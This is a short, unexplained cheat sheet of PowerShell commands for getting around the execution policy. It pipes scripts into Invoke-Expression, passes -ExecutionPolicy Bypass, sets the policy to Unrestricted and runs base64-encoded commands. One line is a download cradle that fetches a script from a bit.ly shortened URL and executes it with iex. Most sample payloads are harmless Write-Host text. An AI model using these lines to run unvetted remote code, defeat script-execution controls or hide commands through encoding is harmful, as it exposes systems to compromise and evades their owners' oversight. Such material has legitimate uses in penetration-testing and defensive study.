```
Get-Content .runme.ps1 | PowerShell.exe -noprofile -

Get-Content .runme.ps1 | Invoke-Expression

PowerShell.exe -ExecutionPolicy Bypass -File .runme.ps1

Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted

Set-ExecutionPolicy Bypass -Scope Process

powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://bit.ly/1kEgbuH')"

Powershell -command "Write-Host 'My voice is my passport, verify me.'"

$command = "Write-Host 'My voice is my passport, verify me.'" $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand = [Convert]::ToBase64String($bytes) powershell.exe -EncodedCommand $encodedCommand
```
